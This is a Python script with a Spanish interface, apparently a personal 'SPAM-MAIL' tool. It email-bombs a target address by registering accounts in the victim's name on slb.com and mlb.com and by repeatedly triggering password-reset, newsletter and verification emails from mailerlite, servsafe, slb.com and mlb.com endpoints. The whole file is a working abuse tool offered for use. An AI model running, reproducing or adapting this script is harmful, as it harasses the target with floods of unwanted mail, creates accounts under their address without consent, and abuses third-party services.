import requests
import random
import colorama
import os
from time import sleep
import json
from colorama import Fore,init
from requests.structures import CaseInsensitiveDict
init()
v = Fore.LIGHTGREEN_EX
re = Fore.LIGHTRED_EX
w = Fore.LIGHTWHITE_EX
c = Fore.LIGHTCYAN_EX
os.system("clear")
def portada():
    print(f"""{re}
  ___________________  _____      _____               _____      _____  .___.____     
 /   _____/\______   \/  _  \    /     \             /     \    /  _  \ |   |    |    
 \_____  \  |     ___/  /_\  \  /  \ /  \   ______  /  \ /  \  /  /_\  \|   |    |    
 /        \ |    |  /    |    \/    Y    \ /_____/ /    Y    \/    |    \   |    |___ 
/_______  / |____|  \____|__  /\____|__  /         \____|__  /\____|__  /___|_______ \        
        """)

    print(f"{v}Herramienta desarrollada por nicolas.$ | Discord:nicolas.$#4882")


portada()
correo = str(input(f"{v}Digite el correo a hacer el spam: "))
def opc():
    
    print(f"{w}1.Ir a la herramienta")
    print(f"{w}2.Salir")

opc()
url7 = "https://app.mailerlite.com/webforms/submit/l1d7r5?callback=jQuery111305331636818546479_1649526738285&fields[email]=" + str("{}".format(correo)) +"&ml-submit=1&ajax=1&guid=&_=1649526738286"
url5 = 'https://profile.mlb.com/api/v1/authn/recovery/password'
url4 = 'https://profile.mlb.com/api/v1/users?activate=true'
url2 = "https://api.slb.com/api/auth/password/forgot?emailAddress=" + str("{}".format(correo))+"&emailTemplateId={0DA48535-7880-4670-AC80-8164330B907F}"
url1 = 'https://api.slb.com/api/auth/register'
url3 = "https://myprofile-ext.servsafe.com/EmailVerification/SendVerificationCode?Site=servsafe.com&Email=" + str("{}".format(correo)) + "&Language=en-US"
def register1():
    r7 = requests.get(url7)
    r2 = requests.get(url3)
    _json ={"EmailAddress": "{}".format(correo), "Password" : "Nicolas001?", "RegistrationSource" : "Connect", "FirstName" : "asdasdas", "LastName" : "dasdasd", "Affiliation" : "30", "Company" : "asdasd", "JobTitle" : "asdasdasd", "Region" : "AD", "EmailTemplateId" : "{496E231C-DB8B-40FA-B1A6-414429AF33AE}","RegistrationSource" : "SLBCom"}
    _headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"}
    responseee = requests.post(url1, data=json.dumps(_json), headers= _headers)
    _json2 = {"profile":{"email":"{}".format(correo),"birthYear":2000,"birthMonth":9,"birthDay":10,"commercialEmailsOptin":str("false")},"credentials":{"password":{"value":"Nicolas001?"}}}
    responseee2 = requests.post(url4, data=json.dumps(_json2), headers= _headers)
    if responseee.status_code == 200:
        print(f"{v}Correo creado con exito")
    else:
        print(f"{re}Correo creado sin exito")
        sleep(3)
        portada()
        opc()
def enviof1():
    i=1
    while i <= 5:
        r7 = requests.get(url7)
        r2 = requests.get(url3)
        r = requests.post(url2)
        _json3 = {"username":"{}".format(correo),"factorType":"EMAIL","relayState":"https://www.mlb.com"}
        _headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"}
        responseee = requests.post(url5, data=json.dumps(_json3), headers=_headers)
        if r.status_code == 200:
          print(f"{v}Correo {i} de 5 enviado con exito")
        else:
          print(f"{re}Correo {i} de 5 enviado sin exito")
        i+=1

    

def opciones():
 op_in = input(str("Digite que quiere hacer: "))

 if op_in == "1":
    necesario_crear_correo = input(str(f"{v}Digite SI, si ya habia utilizado esta herramienta en el correo {correo}, sino, digite NO: "))
    if necesario_crear_correo == "SI": 
      print(f"{c}El correo a hacer spam es {correo}")
      enviof1()
      os.system("clear")
      portada()
      opc()
      opciones()
    elif necesario_crear_correo == "NO":
     print(f"{c}El correo a hacer spam es {correo}")
     register1()
     enviof1()
     os.system("clear")
     portada()
     opc()
     opciones()
 elif op_in == "2":
    print(f"{re}Saliendo...")
    sleep(3)
    exit()
 else:
    print(f"{re}Digite una opcion valida...")
    sleep(3)
    os.system("clear")
    portada()
    opc()
    opciones()





opciones()
